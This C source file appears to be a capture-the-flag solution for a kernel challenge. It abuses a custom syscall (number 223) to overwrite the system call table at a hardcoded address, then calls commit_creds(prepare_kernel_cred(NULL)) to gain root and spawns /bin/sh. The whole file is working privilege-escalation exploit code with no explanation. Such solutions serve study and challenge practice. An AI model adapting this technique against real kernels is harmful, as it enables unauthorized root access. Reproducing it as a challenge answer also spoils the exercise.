#include <stddef.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdlib.h>
#include <stdio.h>

#define SYS_CALL_TABLE ((void**)0x8000e348)
#define SYS_upper 223

long sys_getroot(void* (*lpfn_prepare_kernel_cred)(void*), int (*lpfn_commit_creds)(void*)) {
    return lpfn_commit_creds(lpfn_prepare_kernel_cred(NULL));
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        puts("Usage:");
        puts("    ./solve <prepare_kernel_cred_addr> <commit_creds_addr>");
        return -1;
    } else {
        size_t i;
        void* lpfn_prepare_kernel_cred = (void*)strtoul(argv[1], NULL, 16);
        void* lpfn_commit_creds = (void*)strtoul(argv[2], NULL, 16);
        uint8_t buf[sizeof(void*) + 1] = {0};

        printf("[*] sys_getroot = %p\n", sys_getroot);

        *(void**)buf = (void*)sys_getroot;
        for (i = 0; i < sizeof(void*); ++i) {
            if (buf[i] == 0 || 'a' <= buf[i] && buf[i] <= 'z') {
                puts("Cannot get root for now.");
                return -1;
            }
        }

        printf("[*] lpfn_prepare_kernel_cred = %p\n", lpfn_prepare_kernel_cred);
        printf("[*] lpfn_commit_creds = %p\n", lpfn_commit_creds);

        syscall(SYS_upper, buf, SYS_CALL_TABLE + SYS_upper);
        syscall(SYS_upper, lpfn_prepare_kernel_cred, lpfn_commit_creds);

        puts("Launching shell...");
        system("/bin/sh");
        return 0;
    }
}
